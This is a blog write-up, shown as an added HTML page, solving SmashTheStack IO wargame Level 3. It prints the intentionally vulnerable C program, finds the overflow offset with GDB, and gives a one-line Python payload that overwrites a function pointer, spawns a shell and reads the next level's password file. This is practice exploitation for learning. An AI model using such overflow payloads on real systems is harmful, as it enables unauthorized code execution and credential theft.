@@ -1,0 +1,436 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>SmashTheStack IO Level 3 - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="SmashTheStack IO Level 3">
+  <meta name="keywords" content="smash the stack, wargames">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">SmashTheStack IO Level 3</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-07T21:37:07+03:00" pubdate data-updated="true">Jul 7<span>th</span>, 2014</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>This is the source code for level03.c:</p>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//bla, based on work by beach</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">good</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Win.&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="kt">void</span> <span class="nf">bad</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I&#39;m so sorry, you&#39;re at %p and you want to be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">bad</span><span class="p">,</span> <span class="n">good</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">functionpointer</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="n">bad</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;This is exciting we&#39;re going to %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">functionpointer</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">functionpointer</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Function overview</h4>
+
+<p><strong>memcpy</strong></p>
+
+<p><em>void <em>memcpy(void </em>dest, const void *src, size_t n);</em></p>
+
+<p>Copies  <em>n</em> bytes from memory area <em>src</em> to memory area <em>dest</em>. The memory areas must not overlap.</p>
+
+<p>The function does not check for any terminating null character in <em>src</em>.</p>
+
+<p>Returns a pointer to <em>dest</em>.</p>
+
+<p><strong>memset</strong></p>
+
+<p><em>void <em>memset(void </em>buf, int value, size_t count);</em></p>
+
+<p><em>buf</em> = Pointer to the block of memory to fill.</p>
+
+<p><em>value</em> = Value to be set. The value is passed as an int, but the function fills the block of memory using the unsigned char conversion of this value.</p>
+
+<p><em>count</em> = Number of bytes to be set to the value.</p>
+
+<p>Sets the first <em>count</em> bytes of the block of memory pointed by <em>buf</em> to the specified <em>value</em></p>
+
+<p>Returns a pointer to the memory area <em>buf</em></p>
+
+<p>The most common use of <em>memset()</em> is to initialize a region of memory to some known value.</p>
+
+<h4>Program description</h4>
+
+<p>Running the program we see this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>This is exciting we're going to 0x80484a4
+</span><span class='line'>I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we know the bad function address is at 0x80484a4 and the good function address is at 0x8048474. A function pointer is set to point to the address of the bad function. The program checks for an argument that is at least 4 in length. Then memset sets all except the last 4 bytes of the buffer to 0. There is a buffer overflow in how the program copies the argument to the buffer, without checking for boundaries. This will be key in exploiting the binary.</p>
+
+<p>I proceeded through feeding a string to the program that I created with <code>pattern_create.rb</code>. Then I ran the program with GDB:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x63413563 in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So EIP points to some junk that I provided with the string. Let&rsquo;s check the offset:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./pattern_offset.rb 0x63413563
+</span><span class='line'>[*] Exact match at offset 76</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent! Since we already have the address we need for the good function that will spawn us a shell, the next step is simple:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level3@io:/levels$ ./level03 $(python -c 'print "A" * 76 + "\x74\x84\x04\x08"')
+</span><span class='line'>This is exciting we're going to 0x8048474
+</span><span class='line'>Win.
+</span><span class='line'>sh-4.2$ whoami
+</span><span class='line'>level4
+</span><span class='line'>sh-4.2$ cat /home/level4/.pass
+</span><span class='line'>9C4Jxjc3O3IjB7nXej</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We hijacked the execution flow and made EIP point to the address of the function we needed.</p>
+
+<blockquote><p>The surest protection against temptation is cowardice.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-07T21:37:07+03:00" pubdate data-updated="true">Jul 7<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/exploit/'>exploit</a>, <a class='category' href='/blog/categories/smashthestack/'>smashthestack</a>, <a class='category' href='/blog/categories/wargames/'>wargames</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/07/03/smashthestack-io-level-2/" title="Previous Post: SmashTheStack IO Level 2">&laquo; SmashTheStack IO Level 2</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>About Me</h1>
+  <p>I am an information security enthusiast and I love Python and Linux. I got seriously interested in this field somewhere in 2012, and since then it's been a non-stop learning journey. I don't have a formal education in computer science, but I've been studying by myself with the help of various books, sites, online classes and of course, lots of practice.</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/07/07/smashthestack-io-level-3/">SmashTheStack IO Level 3</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/07/03/smashthestack-io-level-2/">SmashTheStack IO Level 2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/07/03/smashthestack-io-level-1/">SmashTheStack IO Level 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/06/27/kioptrix-2014/">Kioptrix 2014</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/06/22/pentest-lab-kioptrix-level-4/">Pentest lab - Kioptrix Level 4</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/';
+        var disqus_url = 'http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
